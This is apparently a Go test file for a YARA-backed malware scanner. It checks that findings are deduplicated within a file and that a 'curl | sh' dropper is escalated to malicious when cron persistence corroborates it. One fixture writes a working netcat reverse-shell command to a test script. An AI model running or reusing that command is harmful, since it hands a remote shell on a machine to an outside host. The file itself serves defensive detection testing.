package scanner_test

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"aether/internal/config"
	"aether/internal/events"
	"aether/internal/report"
	"aether/internal/scanner"
	"aether/internal/yara"
)

type mockCorroborationYaraEngine struct {
	ruleMatches []yara.RuleMatch
}

func (m *mockCorroborationYaraEngine) LoadRules(rulePaths []string) error { return nil }
func (m *mockCorroborationYaraEngine) Enabled() bool                      { return true }
func (m *mockCorroborationYaraEngine) Close() error                       { return nil }
func (m *mockCorroborationYaraEngine) NewScanner() yara.Scanner {
	return &mockCorroborationYaraScanner{engine: m}
}
func (m *mockCorroborationYaraEngine) Coverage() events.YARACoverageStats {
	return events.YARACoverageStats{RulesLoaded: 1}
}

type mockCorroborationYaraScanner struct {
	engine *mockCorroborationYaraEngine
}

func (s *mockCorroborationYaraScanner) Scan(target yara.ScanTarget) ([]yara.RuleMatch, error) {
	return s.engine.ruleMatches, nil
}
func (s *mockCorroborationYaraScanner) Destroy() {}

func TestScanner_IntraFileDeduplication(t *testing.T) {
	tmpDir := t.TempDir()
	filePath := filepath.Join(tmpDir, "revshell.sh")
	content := []byte("#!/bin/bash\nnc -e /bin/bash 10.0.0.1 4444\n")
	if err := os.WriteFile(filePath, content, 0755); err != nil {
		t.Fatal(err)
	}

	cfg := config.NewDefaultConfig()
	cfg.Scan.Root = tmpDir
	cfg.Scan.Paths = []string{filePath}
	cfg.Scan.ExplicitPaths = true
	cfg.Scan.Threads = 1

	bus := events.NewEventBus()
	defer bus.Close()
	sub := bus.Subscribe()
	defer sub.Close()

	mockYara := &mockCorroborationYaraEngine{
		ruleMatches: []yara.RuleMatch{
			{
				RuleName:   "Linux_Reverse_Shell_YARA",
				Severity:   report.SeverityAlert,
				Score:      90,
				Confidence: "high",
			},
		},
	}

	var findings []report.Finding
	done := make(chan struct{})
	go func() {
		defer close(done)
		for ev := range sub.Events() {
			if fe, ok := ev.(events.FindingRaised); ok {
				findings = append(findings, fe.Finding)
			}
			if _, ok := ev.(events.ScanFinished); ok {
				return
			}
		}
	}()

	s := scanner.NewScanner(cfg, bus, nil, nil,
		scanner.WithModules(nil),
		scanner.WithYARAEngine(mockYara),
	)
	if err := s.Run(context.Background()); err != nil {
		t.Fatalf("scanner Run failed: %v", err)
	}
	<-done

	// Must produce exactly 1 canonical finding for the file
	if len(findings) != 1 {
		t.Fatalf("expected 1 consolidated finding, got %d", len(findings))
	}

	f := findings[0]
	if f.Verdict != report.VerdictMalicious {
		t.Errorf("expected VerdictMalicious, got %s", f.Verdict)
	}
	if f.Severity != report.SeverityAlert {
		t.Errorf("expected SeverityAlert, got %s", f.Severity)
	}
	if f.EvidenceRecord == nil {
		t.Fatal("expected EvidenceRecord to be non-nil")
	}
	// ContributingDetectors should record the secondary rule match
	if len(f.EvidenceRecord.ContributingDetectors) == 0 {
		t.Errorf("expected non-empty ContributingDetectors, got none")
	} else if f.EvidenceRecord.ContributingDetectors[0] != "Linux_Reverse_Shell_YARA" {
		t.Errorf("expected contributing detector Linux_Reverse_Shell_YARA, got %s", f.EvidenceRecord.ContributingDetectors[0])
	}
}

func TestScanner_DropperEscalationWithCorroboration(t *testing.T) {
	// 1. Uncorroborated standalone dropper -> SUSPICIOUS / WARNING
	fUncorroborated := report.NewFinding("scanner", report.SeverityWarning, "/usr/local/bin/installer.sh", "curl | sh dropper detected", "Script_Download_And_Execute")
	v1 := report.DetermineVerdict(&fUncorroborated, nil, true, false, false, nil)
	if v1 != report.VerdictSuspicious {
		t.Errorf("expected uncorroborated dropper to be SUSPICIOUS, got %s", v1)
	}
	if fUncorroborated.Severity != report.SeverityWarning {
		t.Errorf("expected uncorroborated dropper to be WARNING, got %s", fUncorroborated.Severity)
	}

	// 2. Corroborated dropper in autostart / cron -> MALICIOUS / ALERT
	fCorroborated := report.NewFinding("scanner", report.SeverityWarning, "/tmp/drop.sh", "curl | sh dropper detected", "Script_Download_And_Execute")
	v2 := report.DetermineVerdict(&fCorroborated, nil, true, false, false, []string{"persistence:/etc/cron.hourly/drop"})
	if v2 != report.VerdictMalicious {
		t.Errorf("expected corroborated dropper to be MALICIOUS, got %s", v2)
	}
	if fCorroborated.Severity != report.SeverityAlert {
		t.Errorf("expected corroborated dropper to be ALERT, got %s", fCorroborated.Severity)
	}
	if fCorroborated.Confidence != report.ConfidenceHigh {
		t.Errorf("expected corroborated dropper confidence HIGH, got %s", fCorroborated.Confidence)
	}
}
